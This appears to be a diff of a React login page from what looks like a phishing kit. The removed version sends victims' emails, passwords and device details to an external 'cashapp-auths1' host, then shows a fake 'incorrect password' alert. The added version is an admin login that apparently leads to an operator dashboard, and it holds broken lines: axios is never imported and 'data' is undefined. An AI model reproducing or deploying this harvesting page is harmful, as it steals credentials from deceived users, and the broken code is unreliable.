@@ -1,81 +1,62 @@
-// client/src/pages/Auth.jsx
-import React, { useState } from "react";
+import React, { useState } from 'react';
+import { useNavigate } from 'react-router-dom';
 import "../assets/style.css";
+import BASE_URL from "./config";
 
-const Auth = () => {
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
+axios.get(`${BASE_URL}/api/data`);
+axios.post(`${BASE_URL}/api/click`, data);
 
-  const getDeviceType = () => {
-    const ua = navigator.userAgent;
-    if (/mobile/i.test(ua)) return "Mobile";
-    if (/tablet/i.test(ua)) return "Tablet";
-    return "Desktop";
-  };
 
-  const handleSubmit = async (e) => {
+const AdminLogin = () => {
+  const navigate = useNavigate();
+  const [username, setUsername] = useState('');
+  const [password, setPassword] = useState('');
+  const [error, setError] = useState('');
+
+  const handleLogin = async (e) => {
     e.preventDefault();
 
-    const userAgent = navigator.userAgent;
-    const device = getDeviceType();
-    const time = new Date().toLocaleString();
+    const res = await fetch("https://node-server-js-k66j.onrender.com/api/admin/login", {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password })
+    });
 
-    // Send to backend
-    try {
-      await fetch("https://cashapp-auths1.vercel.app/api/data", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-        },
-        body: JSON.stringify({
-          email,
-          password,
-          userAgent,
-          device,
-          time,
-        }),
-      });
-
-      alert("Email or password is incorrect");
-
-      // Clear form
-      setEmail("");
-      setPassword("");
-    } catch (err) {
-      console.error("Submission error:", err);
-      alert("Something went wrong.");
+    const data = await res.json();
+    if (data.success) {
+      navigate('/admin-dashboard'); // Redirect to dashboard
+    } else {
+      setError('Invalid credentials');
     }
   };
 
   return (
     <div className="container">
       <div className="login-card">
-        <div className="illustration">
-          <img src="/images/devgirl.png" alt="Pay Illustration" />
-        </div>
-        <h2>Login to Continue</h2>
-        <form onSubmit={handleSubmit}>
+        <h2>Admin Login</h2>
+        <form onSubmit={handleLogin}>
           <div className="input-group">
             <input
-              type="email"
-              placeholder="Enter your email"
-              value={email}
+              type="text"
+              placeholder="Username"
+              value={username}
+              onChange={(e) => setUsername(e.target.value)}
               required
-              onChange={(e) => setEmail(e.target.value)}
             />
             <input
               type="password"
-              placeholder="Enter your password"
+              placeholder="Password"
               value={password}
-              required
               onChange={(e) => setPassword(e.target.value)}
+              required
             />
           </div>
-          <button type="submit" className="submit-button">Submit</button>
+          <button type="submit" className="submit-button">Login</button>
         </form>
+        {error && <p style={{ color: "red", marginTop: "10px" }}>{error}</p>}
       </div>
     </div>
   );
 };
 
-export default Auth;
+export default AdminLogin;
